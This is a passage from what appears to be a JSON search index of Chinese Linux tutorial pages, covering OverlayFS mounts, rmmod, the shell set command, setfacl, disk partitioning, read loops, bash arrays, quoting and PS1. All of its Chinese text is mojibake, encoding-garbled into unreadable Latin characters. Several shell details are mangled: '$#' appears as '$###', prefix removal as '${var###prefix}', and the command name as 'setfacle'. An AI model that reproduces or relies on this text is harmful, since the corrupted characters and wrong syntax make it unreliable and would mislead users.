åœ¨å¦ä¸€ä¸ªåˆ†åŒºè¡¨ä¸­æœ‰å¯ç”¨çš„ç©ºé—´ï¼ˆä¾‹å¦‚ï¼Œ /path/to/empty å’Œ /path/to/work ï¼‰ï¼Œ ä½ å¯ä»¥åœ¨å…¶ä¸­å»ºç«‹ä¸€ä¸ªç›®å½•å¹¶å †æ ˆåˆ°ä½ éœ€è¦ç©ºé—´çš„é‚£ä¸ªæ—§çš„ç›®å½•ï¼ˆä¾‹å¦‚ï¼Œ /path/to/old ï¼‰ï¼Œ è¦è¿™æ ·åšï¼Œä½ éœ€è¦ç”¨äº Linux 3.18 ç‰ˆå†…æ ¸æˆ–æ›´æ–°ç‰ˆæœ¬ï¼ˆå¯¹åº” Debian Stetch 9.0 æˆ–æ›´æ–°ç‰ˆæœ¬ï¼‰ çš„ OverlayFS $ sudo mount -t overlay overlay \\ -olowerdir=/path/to/old-dir,upperdir=/path/to/empty,workdir=/path/to/work /path/to/empty å’Œ /path/to/work åº”è¯¥ä½äºå¯è¯»å†™çš„åˆ†åŒºï¼Œä»è€Œèƒ½å¤Ÿå†™å…¥ /path/to/old","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mount.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mount.html"},{"title":"rmmod","text":"å‚æ•°ï¼š -f å¼ºåˆ¶å°†è¯¥æ¨¡ç»„ç§»é™¤æ‰ï¼Œä¸è®ºæ˜¯å¦æ­£è¢«ä½¿ç”¨ï¼› -w è‹¥è¯¥æ¨¡ç»„æ­£è¢«ä½¿ç”¨ï¼Œåˆ™ rmmod ä¼šç­‰å¾…è¯¥æ¨¡ç»„è¢«ä½¿ç”¨å®Œæ¯•åï¼Œæ‰ç§»é™¤ä»–ï¼ å†…æ ¸æ¨¡å—å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/å†…æ ¸æ¨¡å—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rmmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rmmod.html"},{"title":"set","text":"setå‘½ä»¤ç”¨äºè®¾ç½®æ˜¾ç¤ºå½“å‰shellçš„å˜é‡ã€‚ setæŒ‡ä»¤èƒ½è®¾ç½®æ‰€ä½¿ç”¨shellçš„æ‰§è¡Œæ–¹å¼ï¼Œå¯ä¾ç…§ä¸åŒçš„éœ€æ±‚æ¥åšè®¾ç½®ã€‚ è¯­æ³•: set [+-abCdefhHklmnpPtuvx] è‹¥ä¸åŠ ä»»ä½•å‚æ•°, ä¼š æ˜¾ç¤ºå½“å‰çš„ç¯å¢ƒå˜é‡å’Œä½ç½®å‚æ•° . è¿™æ—¶å€™äºenvåŒºåˆ«å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/env å¸¸ç”¨: # set -e #è‹¥æŒ‡ä»¤ä¼ å›å€¼ä¸ç­‰äº0ï¼Œåˆ™ç«‹å³é€€å‡º +e #å…³é—­ä¸Šé¢é‚£ä¸ªï¼Œè®©åŸè„šæœ¬ç»§ç»­æ‰§è¡Œ ä¸€èˆ¬é…å¥—ä½¿ç”¨ -- <args> #è®¾ç½®å‚æ•° å¦‚ set -- h1 h2 ;echo $@,$# #h1 h2,2 é€‰é¡¹å‚æ•° -a æ ‡ç¤ºå·²ä¿®æ”¹çš„å˜é‡ï¼Œä»¥ä¾›è¾“å‡ºè‡³ç¯å¢ƒå˜é‡ã€‚ -b ä½¿è¢«ä¸­æ­¢çš„åå°ç¨‹åºç«‹åˆ»å›æŠ¥æ‰§è¡ŒçŠ¶æ€ã€‚ -C è½¬å‘æ‰€äº§ç”Ÿçš„æ–‡ä»¶æ— æ³•è¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶ã€‚ -d Shellé¢„è®¾ä¼šç”¨æ‚å‡‘è¡¨è®°å¿†ä½¿ç”¨è¿‡çš„æŒ‡ä»¤ï¼Œä»¥åŠ é€ŸæŒ‡ä»¤çš„æ‰§è¡Œã€‚ä½¿ç”¨-då‚æ•°å¯å–æ¶ˆã€‚ -e è‹¥æŒ‡ä»¤ä¼ å›å€¼ä¸ç­‰äº0ï¼Œåˆ™ç«‹å³é€€å‡ºshellã€‚ -f å–æ¶ˆä½¿ç”¨é€šé…ç¬¦ã€‚ -h è‡ªåŠ¨è®°å½•å‡½æ•°çš„æ‰€åœ¨ä½ç½®ã€‚ -H <Shell> å¯åˆ©ç”¨\"!\"åŠ <æŒ‡ä»¤ç¼–å·>çš„æ–¹å¼æ¥æ‰§è¡Œhistoryä¸­è®°å½•çš„æŒ‡ä»¤ã€‚ -k æŒ‡ä»¤æ‰€ç»™çš„å‚æ•°éƒ½ä¼šè¢«è§†ä¸ºæ­¤æŒ‡ä»¤çš„ç¯å¢ƒå˜é‡ã€‚ -l è®°å½•forå¾ªç¯çš„å˜é‡åç§°ã€‚ -m ä½¿ç”¨ç›‘è§†æ¨¡å¼ã€‚ -n åªè¯»å–æŒ‡ä»¤ï¼Œè€Œä¸å®é™…æ‰§è¡Œã€‚ -p å¯åŠ¨ä¼˜å…ˆé¡ºåºæ¨¡å¼ã€‚ -P å¯åŠ¨-På‚æ•°åï¼Œæ‰§è¡ŒæŒ‡ä»¤æ—¶ï¼Œä¼šä»¥å®é™…çš„æ–‡ä»¶æˆ–ç›®å½•æ¥å–ä»£ç¬¦å·è¿æ¥ã€‚ -t æ‰§è¡Œå®Œéšåçš„æŒ‡ä»¤ï¼Œå³é€€å‡ºshellã€‚ -u å½“æ‰§è¡Œæ—¶ä½¿ç”¨åˆ°æœªå®šä¹‰è¿‡çš„å˜é‡ï¼Œåˆ™æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯, å¯ä»¥ä¸-eä¸€èµ·ä½¿ç”¨ -v æ˜¾ç¤ºshellæ‰€è¯»å–çš„è¾“å…¥å€¼ã€‚ -x æ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ -g x è®¾ç½®å…¨å±€å˜é‡ -s x è®¾ç½®æœ¬åœ°å˜é‡ å…¶ä»–: +<å‚æ•°> å–æ¶ˆæŸä¸ªsetæ›¾å¯åŠ¨çš„å‚æ•°ã€‚ ä¸€äº›ç”¨é€” set æŒ‡ä»¤åœ¨Shellè„šæœ¬ä¸­æœ‰å¤šç§ä½œç”¨ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç”¨æ³•: è®¾ç½®ä½ç½®å‚æ•°ï¼šä½¿ç”¨ set å‘½ä»¤å¯ä»¥å°†ä¸€ä¸ªæˆ–å¤šä¸ªå€¼è®¾ç½®ä¸ºè„šæœ¬çš„ä½ç½®å‚æ•°ã€‚ ä¾‹å¦‚ï¼šset foo bar ä¼šå°† foo å’Œ bar åˆ†åˆ«è®¾ç½®ä¸º $1 å’Œ $2ã€‚ æ˜¾ç¤ºå’Œä¿®æ”¹Shellé€‰é¡¹ï¼šä½¿ç”¨ set -<option> å‘½ä»¤å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨ç‰¹å®šçš„Shellé€‰é¡¹ã€‚ ä¾‹å¦‚ï¼Œset -e å¯ç”¨äº†è„šæœ¬çš„å¼‚å¸¸ç»ˆæ­¢ï¼ˆé”™è¯¯å³é€€å‡ºï¼‰é€‰é¡¹ã€‚ æ˜¾ç¤ºå’Œä¿®æ”¹å˜é‡ï¼šä½¿ç”¨ set å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰è®¾ç½®çš„å˜é‡ã€‚ ä¾‹å¦‚ï¼Œset ä¼šæ˜¾ç¤ºæ‰€æœ‰çš„ç¯å¢ƒå˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚å¯ä»¥ä½¿ç”¨ set <variable>=<value> æ¥ä¿®æ”¹æˆ–åˆ›å»ºæ–°çš„å˜é‡ã€‚ å±•å¼€å˜é‡ï¼šä½¿ç”¨ set -x å‘½ä»¤å¯ä»¥æ‰“å¼€è„šæœ¬çš„è°ƒè¯•æ¨¡å¼ï¼Œä»è€Œåœ¨è¿è¡Œè„šæœ¬æ—¶è¾“å‡ºæ¯ä¸ªå‘½ä»¤çš„å±•å¼€ç»“æœã€‚ å¤„ç†å‘½ä»¤è¡Œé€‰é¡¹ï¼šä½¿ç”¨ set -- <args> å¯ä»¥å°†æŒ‡å®šçš„å‚æ•°è®¾ç½®ä¸ºè„šæœ¬çš„ä½ç½®å‚æ•°ï¼Œè¿™æ ·å°±å¯ä»¥åƒå¤„ç†å‘½ä»¤è¡Œé€‰é¡¹ä¸€æ ·è®¿é—®å’Œå¤„ç†è¿™äº›å‚æ•°ã€‚ é…ç½®ç‰¹æ®Šå­—ç¬¦ï¼šä½¿ç”¨ set å‘½ä»¤å¯ä»¥æ›´æ”¹Shellçš„ç‰¹æ®Šå­—ç¬¦å¤„ç†æ–¹å¼ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ set -f å¯ä»¥ç¦ç”¨æ–‡ä»¶åæ‰©å±•ã€‚ æ³¨è§£ set å‘½ä»¤çš„å…·ä½“è¡Œä¸ºå¯èƒ½ä¼šå› ä¸åŒçš„Shellå’Œç¯å¢ƒè€Œæœ‰æ‰€ä¸åŒã€‚ å¯ä»¥ä½¿ç”¨ help set æˆ–æŸ¥é˜…ç›¸å…³æ–‡æ¡£æ¥è·å–æ›´è¯¦ç»†çš„ä¿¡æ¯ åœ¨ shell ä¸­æ‰§è¡Œ set -x æˆ–ä½¿ç”¨ -x é€‰é¡¹å¯åŠ¨ shell å¯ä»¥è®© shell æ˜¾ç¤ºå‡ºæ‰€æœ‰æ‰§è¡Œçš„å‘½ä»¤. å¯¹è°ƒè¯•æ¥è¯´æ˜¯éå¸¸æ–¹ä¾¿çš„","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-set.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-set.html"},{"title":"setfacle","text":"è®¾ç½®aclæƒé™: setfacle é€‰é¡¹ æ–‡ä»¶å é€‰é¡¹ -m è®¾å®š ACL æƒé™ã€‚ å¦‚æœæ˜¯ç»™äºˆç”¨æˆ· ACL æƒé™ï¼Œåˆ™ä½¿ç”¨\"u:ç”¨æˆ·åï¼šæƒé™\"æ ¼å¼èµ‹äºˆï¼› å¦‚æœæ˜¯ç»™äºˆç»„ ACL æƒé™ï¼Œåˆ™ä½¿ç”¨\"g:ç»„åï¼šæƒé™\" æ ¼å¼èµ‹äºˆï¼› -x åˆ é™¤æŒ‡å®šçš„ ACL æƒé™ï¼› -b åˆ é™¤æ‰€æœ‰çš„ ACL æƒé™ï¼› -d è®¾å®šé»˜è®¤ ACL æƒé™ã€‚åªå¯¹ç›®å½•ç”Ÿæ•ˆï¼ŒæŒ‡ç›®å½•ä¸­æ–°å»ºç«‹çš„æ–‡ä»¶æ‹¥æœ‰æ­¤é»˜è®¤æƒé™ï¼› -k åˆ é™¤é»˜è®¤ ACL æƒé™ï¼› -R é€’å½’è®¾å®š ACL æƒé™ã€‚æŒ‡è®¾å®šçš„ ACL æƒé™ä¼šå¯¹ç›®å½•ä¸‹çš„æ‰€æœ‰å­æ–‡ä»¶ç”Ÿæ•ˆï¼› å…³äºACLæƒé™å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/ACLæƒé™æ§åˆ¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfal.html"},{"title":"wall","text":"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wall.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wall.html"},{"title":"ç¡¬ç›˜åˆ†åŒºé…ç½®","text":"å¯¹äº ç¡¬ç›˜åˆ†åŒº é…ç½®ï¼Œ å°½ç®¡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/fdisk è¢«è®¤ä¸ºæ˜¯æ ‡å‡†çš„é…ç½®ï¼Œ ä½†æ˜¯ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/parted å·¥å…·è¿˜æ˜¯å€¼å¾—æ³¨æ„çš„ è€çš„ PC ä½¿ç”¨ç»å…¸çš„ ä¸»å¼•å¯¼è®°å½•ï¼ˆMaster Boot Recordï¼ŒMBRï¼‰ æ–¹æ¡ˆï¼Œ å°† ç¡¬ç›˜åˆ†åŒº æ•°æ®ä¿å­˜åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œå³ LBA æ‰‡åŒº 0ï¼ˆ512 å­—èŠ‚ï¼‰ã€‚ ä¸€äº›å¸¦æœ‰ å¯æ‰©å±•å›ºä»¶æ¥å£ï¼ˆUnified Extensible Firmware Interfaceï¼ŒUEFIï¼‰ çš„è¿‘ä»£ PCï¼ŒåŒ…æ‹¬åŸºäº Intel çš„ Macï¼Œä½¿ç”¨ å…¨å±€å”¯ä¸€æ ‡è¯†åˆ†åŒºè¡¨ï¼ˆGUID Partition Tableï¼ŒGPTï¼‰ æ–¹æ¡ˆï¼Œ ç¡¬ç›˜åˆ†åŒº æ•°æ®ä¸ä¿å­˜åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºã€‚ å°½ç®¡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/fdisk ä¸€ç›´æ˜¯ç¡¬ç›˜åˆ†åŒºçš„æ ‡å‡†å·¥å…·ï¼Œ ä½†ç°åœ¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/parted æ›¿ä»£äº†å®ƒã€‚ LVM2 LVM2 æ˜¯ä¸€ä¸ªç”¨äº Linux å†…æ ¸çš„ é€»è¾‘å·ç®¡ç†å™¨ . ä½¿ç”¨ LVM2 çš„è¯ï¼Œç¡¬ç›˜åˆ†åŒºå¯ä»¥åˆ›å»ºåœ¨é€»è¾‘å·ä¸Šæ¥æ›¿ä»£ç‰©ç†ç¡¬ç›˜ã€‚ LVM æœ‰ä¸‹åˆ—éœ€æ±‚ Linux å†…æ ¸ä¸­çš„è®¾å¤‡æ˜ å°„æ”¯æŒï¼ˆDebian å†…æ ¸é»˜è®¤æ”¯æŒï¼‰ ç”¨æˆ·è‡ªå®šä¹‰è®¾å¤‡æ˜ å°„æ”¯æŒåº“ï¼ˆ libdevmapper* è½¯ä»¶åŒ…ï¼‰ ç”¨æˆ·è‡ªå®šä¹‰ LVM2 å·¥å…·ï¼ˆ lvm2 è½¯ä»¶åŒ…ï¼‰ é€šè¿‡ $TMPDIR æŒ‡å®šä¸´æ—¶å­˜å‚¨ç›®å½• è§: /docs/æ“ä½œç³»ç»Ÿ/linux/Linuxç¯å¢ƒå˜é‡/TMPDIR æŒ‚è½½å¦ä¸€ä¸ªåˆ†åŒºæ¥æ‰©å±•å¯ç”¨å­˜å‚¨ç©ºé—´ å¦‚æœä½ æœ‰ä¸€ä¸ªç©ºçš„åˆ†åŒºï¼ˆä¾‹å¦‚ /dev/sdx ï¼‰ï¼Œ ä½ å¯ä»¥ä½¿ç”¨ mkfs.ext4 å°†å®ƒæ ¼å¼åŒ–ï¼Œ å¹¶ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/mount å°†å®ƒæŒ‚è½½åˆ°ä½ éœ€è¦æ›´å¤šç©ºé—´çš„ç›®å½•ã€‚ï¼ˆä½ éœ€è¦å¤åˆ¶åŸå§‹æ•°æ®å†…å®¹ã€‚ï¼‰: $ sudo mv work-dir old-dir $ sudo mkfs.ext4 /dev/sdx $ sudo mount -t ext4 /dev/sdx work-dir $ sudo cp -a old-dir/* work-dir $ sudo rm -rf old-dir æ³¨è§£ ä½ ä¹Ÿå¯ä»¥é€‰æ‹©æŒ‚è½½ä¸€ä¸ªç©ºç¡¬ç›˜æ˜ åƒæ–‡ä»¶ ï¼ˆå‚è§ ç¬¬ 9.7.5 èŠ‚ \"åˆ¶ä½œç©ºçš„ç£ç›˜æ˜ åƒæ–‡ä»¶\" ï¼‰ ä½œä¸ºä¸€ä¸ªå¾ªç¯è®¾å¤‡ ï¼ˆå‚è§ ç¬¬ 9.7.3 èŠ‚ \"æŒ‚è½½ç£ç›˜æ˜ åƒæ–‡ä»¶\" )ã€‚ å®é™…çš„ç¡¬ç›˜ä½¿ç”¨é‡ä¼šéšç€å®é™…å­˜å‚¨æ•°æ®çš„å¢åŠ è€Œå¢åŠ  å…³äºæ‰©å±•å¯ç”¨å­˜å‚¨ç©ºé—´å¯è§: Disk-Partition-mount","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html"},{"title":"æ–‡ä»¶è¯»å–","text":"while read line é‡å®šå‘: while read line do â€¦ done < file readé€šè¿‡è¾“å…¥é‡å®šå‘ï¼ŒæŠŠfileçš„ç¬¬ä¸€è¡Œæ‰€æœ‰çš„å†…å®¹èµ‹å€¼ç»™å˜é‡lineï¼Œ å¾ªç¯ä½“å†…çš„å‘½ä»¤ä¸€èˆ¬åŒ…å«å¯¹å˜é‡lineçš„å¤„ç†ï¼› ç„¶åå¾ªç¯å¤„ç†fileçš„ç¬¬äºŒè¡Œã€ç¬¬ä¸‰è¡Œã€‚ã€‚ã€‚ä¸€ç›´åˆ°fileçš„æœ€åä¸€è¡Œã€‚ è¿˜è®°å¾—whileæ ¹æ®å…¶åçš„å‘½ä»¤é€€å‡ºçŠ¶æ€æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œå¾ªç¯ä½“å—ï¼Ÿ æ˜¯çš„ï¼Œreadå‘½ä»¤ä¹Ÿæœ‰é€€å‡ºçŠ¶æ€ï¼Œå½“å®ƒä»æ–‡ä»¶fileä¸­è¯»åˆ°å†…å®¹æ—¶ï¼Œé€€å‡ºçŠ¶æ€ä¸º0ï¼Œå¾ªç¯ç»§ç»­è¿›è¡Œï¼› å½“readä»æ–‡ä»¶ä¸­è¯»å®Œæœ€åä¸€è¡Œåï¼Œä¸‹æ¬¡ä¾¿æ²¡æœ‰å†…å®¹å¯è¯»äº†ï¼Œæ­¤æ—¶readçš„é€€å‡ºçŠ¶æ€ä¸ºé0ï¼Œæ‰€ä»¥å¾ªç¯æ‰ä¼šé€€å‡ºã€‚ ä½¿ç”¨ç®¡é“: command | while read line do â€¦ done","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html"},{"title":"Shellçš„return","text":"shellçš„return ä»Šå¤©å†™bugå‘ç°shellçš„returnä¸ä¹‹å‰javaçš„ä¸ä¸€æ · returnå…¶å®ä¸exitåŸºæœ¬ä¸€è‡´ ä¸ä¸€è‡´çš„åœ°æ–¹åœ¨äºå‡½æ•°å†…returnåªæ˜¯é€€å‡ºå‡½æ•°ï¼Œexité€€å‡ºè„šæœ¬ è¿”å›çš„å€¼åªèƒ½ä¸º0-255çš„æ•°å­— åˆ¤æ–­æ—¶å¯ç”¨ï¼Œè€Œä¸èƒ½ä¼ é€’å­—ç¬¦ä¸²ä¹‹ç±»çš„ æ“ä½œå­—ç¬¦ä¸²åªèƒ½ç”¨å…¨å±€å˜é‡äº†ï¼ˆæˆ–è€…echoï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html"},{"title":"Shellå¾ªç¯","text":"è·³å‡ºå¾ªç¯ continue ä¸ break åé¢è·Ÿ n è¡¨ç¤ºé€€å‡ºå‡ å±‚å¾ªå","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html"},{"title":"Shellä¼ é€’å‚æ•°","text":"ä¸»è¦æ˜¯Shellä¼ é€’å‘½ä»¤è¡Œå‚æ•° ç‰¹æ®Šçš„ shell å‚æ•°ç»å¸¸åœ¨ shell è„šæœ¬é‡Œé¢è¢«ç”¨åˆ°: shell å‚æ•° å€¼ $0 shell æˆ– shell è„šæœ¬çš„åç§° $1 ç¬¬ä¸€ä¸ª shell å‚æ•° $9 ç¬¬ 9 ä¸ª shell å‚æ•° $### ä½ç½®å‚æ•°æ•°é‡ \"$*\" \"$1 $2 $3 $4 â€¦ \" \"$@\" \"$1\" \"$2\" \"$3\" \"$4\" â€¦ $? æœ€è¿‘ä¸€æ¬¡å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç  $$ è¿™ä¸ª shell è„šæœ¬çš„ PID $! æœ€è¿‘å¼€å§‹çš„åå°ä»»åŠ¡ PID Shellå‚æ•°å±•å¼€åˆ—è¡¨ å‚æ•°è¡¨è¾¾å¼å½¢å¼ å¦‚æœ var å˜é‡å·²è®¾ç½®é‚£ä¹ˆå€¼ä¸º å¦‚æœ var å˜é‡æ²¡æœ‰è¢«è®¾ç½®é‚£ä¹ˆå€¼ä¸º: ${var:-string} \"$var\" \"string\" ${var:+string} \"string\" \"null\" ${var:=string} \"$var\" \"string\" (å¹¶è¿è¡Œ \"var=string\") ${var:?string} \"$var\" åœ¨ stderr ä¸­æ˜¾ç¤º \"string\" (å‡ºé”™é€€å‡º) è¯¦è§: shellçš„å˜é‡æ›¿æ¢ é‡è¦çš„Shellå‚æ•°æ›¿æ¢åˆ—è¡¨ å‚æ•°æ›¿æ¢å½¢å¼ä¸ç»“æœ: ${var%suffix} åˆ é™¤ä½äº var ç»“å°¾çš„ suffix æœ€å°åŒ¹é…æ¨¡å¼ ${var%%suffix} åˆ é™¤ä½äº var ç»“å°¾çš„ suffix æœ€å¤§åŒ¹é…æ¨¡å¼ ${var###prefix} åˆ é™¤ä½äº var å¼€å¤´çš„ prefix æœ€å°åŒ¹é…æ¨¡å¼ ${var####prefix} åˆ é™¤ä½äº var å¼€å¤´çš„ prefix æœ€å¤§åŒ¹é…æ¨¡å¼ è¯¦è§: shellçš„å˜é‡æ›¿æ¢","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html"},{"title":"bashæ•°ç»„","text":"å®šä¹‰æ•°ç»„: arr=(a b c d) ${arr[@]} #å’Œ ${arr[*]} #ç›¸åŒï¼Œéƒ½æ˜¯è¿”å›æ•´ä¸ªæ•°ç»„ï¼ŒåŒ…æ‹¬å››ä¸ªå…ƒç´ ã€‚ é€šè¿‡ä¸­æ‹¬å·åŠä¸‹æ ‡è·å–å…¶ä¸­çš„æŸä¸€ä¸ªå…ƒç´ : ${arr[0]} #å¾—åˆ° a (ç¬¬ä¸€ä¸ªå…ƒç´ )ï¼Œ ${arr[1]} #ç¬¬äºŒä¸ª... ä½¿ç”¨äº•å·ï¼ˆ#ï¼‰è®¡ç®—æ•°ç»„çš„é•¿åº¦: ${#arr[@]} #æˆ– ${#arr[*]} #4 ï¼ˆä½¿ç”¨äº•å·è®¡ç®—é•¿åº¦æ—¶ï¼Œè‹¥å‚æ•°ä¸ºå­—ç¬¦ä¸²åˆ™è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè‹¥å‚æ•°ä¸ºæ•°ç»„åˆ™è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°ã€‚ï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html"},{"title":"å•/åŒå¼•å·","text":"å•å¼•å· æ‰€è§å³æ‰€å¾—ï¼Œè¾“å…¥ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆã€‚ å³å°†å•å¼•å·å†…çš„å†…å®¹åŸæ ·è¾“å‡ºï¼Œæˆ–è€…æè¿°ä¸ºå•å¼•å·é‡Œé¢çœ‹åˆ°çš„æ˜¯ä»€ä¹ˆå°±ä¼šè¾“å‡ºä»€ä¹ˆã€‚ åŒå¼•å· è§£æç‰¹æ®Šç¬¦å·ï¼ˆå‘½ä»¤å•¥çš„ï¼‰ï¼Œä¸æ”¯æŒé€šé…ç¬¦è§£æã€‚ æŠŠåŒå¼•å·å†…çš„å†…å®¹è¾“å‡ºå‡ºæ¥ï¼›å¦‚æœå†…å®¹ä¸­æœ‰å‘½ä»¤ã€å˜é‡ç­‰ï¼Œä¼šå…ˆæŠŠå˜é‡ã€å‘½ä»¤è§£æå‡ºç»“æœï¼Œç„¶ååœ¨è¾“å‡ºæœ€ç»ˆå†…å®¹æ¥ã€‚ ä¸åŠ å¼•å· ç‰¹æ®Šç¬¦å·ï¼Œé€šé…ç¬¦å…¨éƒ¨è§£æã€‚ ä¸ä¼šå°†å«æœ‰ç©ºæ ¼çš„å­—ç¬¦ä¸²è§†ä¸ºä¸€ä¸ªæ•´ä½“è¾“å‡º, å¦‚æœå†…å®¹ä¸­æœ‰å‘½ä»¤ã€å˜é‡ç­‰ï¼Œä¼šå…ˆæŠŠå˜é‡ã€å‘½ä»¤è§£æå‡ºç»“æœï¼Œç„¶ååœ¨è¾“å‡ºæœ€ç»ˆå†…å®¹æ¥; å¦‚æœå­—ç¬¦ä¸²ä¸­å¸¦æœ‰ç©ºæ ¼ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™ä¸èƒ½å®Œæ•´çš„è¾“å‡ºï¼Œéœ€è¦æ”¹åŠ åŒå¼•å·ï¼Œä¸€èˆ¬è¿ç»­çš„å­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œè·¯å¾„ç­‰å¯ä»¥ç”¨ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html"},{"title":"å¿«æ·é”®","text":"ctrl ç»„åˆé”® ctrl + c ç»ˆæ­¢ç›®å‰çš„å‘½ä»¤ ctrl + d è¾“å…¥ç»“æŸï¼ˆEOFï¼‰ï¼Œä¾‹å¦‚é‚®ä»¶ç»“æŸçš„æ—¶å€™ ctrl + M enter ctrl + s æš‚åœå±å¹•è¾“å‡º ctrl + q æ¢å¤å±å¹•è¾“å‡º ctrl + u åœ¨æç¤ºå­—ç¬¦ä¸‹ï¼Œå°†æ•´åˆ—å‘½ä»¤åˆ é™¤ ctrl + z æš‚åœ ç›®å‰çš„å‘½ä»¤ å½“è¾“å…¥ä¸€ä¸²æŒ‡ä»¤æ—¶ï¼Œå‘ç°å‰é¢å†™çš„ä¸€ä¸²æ•°æ®æ˜¯é”™çš„ï¼Œ æƒ³è¦åˆ é™¤æ¸¸æ ‡æ‰€åœ¨å¤„åˆ°æœ€å‰é¢çš„æŒ‡ä»¤å†…å®¹ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†: ctrl + u","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shortcut-key.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shortcut-key.html"},{"title":"PS1 æç¤ºç¬¦å®šä¹‰","text":"å‚è€ƒ: linux PS1 æç¤ºç¬¦å®šä¹‰ PS1 å°±æ˜¯ç”¨æˆ·å¹³æ—¶çš„æç¤ºç¬¦ã€‚ PS2 ç¬¬ä¸€è¡Œæ²¡è¾“å®Œï¼Œç­‰å¾…ç¬¬äºŒè¡Œè¾“å…¥çš„æç¤ºç¬¦ã€‚ Linuxç³»ç»Ÿæç¤ºç¬¦æ˜¯ç”¨ç³»ç»Ÿå˜é‡PS1æ¥å®šä¹‰çš„ã€‚ ä¸€èˆ¬ç³»ç»Ÿé»˜è®¤çš„å½¢å¼æ˜¯ï¼š[ username@host å·¥ä½œç›®å½•]$. ç”¨ echo $PS1 å¯ä»¥å¾—åˆ°PS1çš„å€¼ï¼Œå³: PS1=\"[\\u@\\h \\w]\"\\$ ç™»å½•åå¯ä»¥æ›´æ”¹PS1çš„æ˜¾ç¤ºæ ·å¼ï¼Œä½†æ˜¯å½“é€€å‡ºé‡å¯ç™»å½•è¿›å…¥ç³»ç»Ÿåï¼Œ æ ·å¼åˆå˜æˆç³»ç»Ÿé»˜è®¤çš„æ ·å¼äº†ï¼Œå¦‚æœè¦å½»åº•æ”¹å˜å®ƒçš„æ ·å¼ï¼Œåªèƒ½ä»é…ç½®æ–‡ä»¶ä¸­æ”¹ã€‚ PSæ˜¯åœ¨ç”¨æˆ·æ ¹ç›®å½•ä¸‹çš„.bash_profileä¸­å®šä¹‰çš„ã€‚ å¦‚: # .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs ä»¥ä¸‹æ˜¯è®¾å®šçš„PS1çš„å€¼: 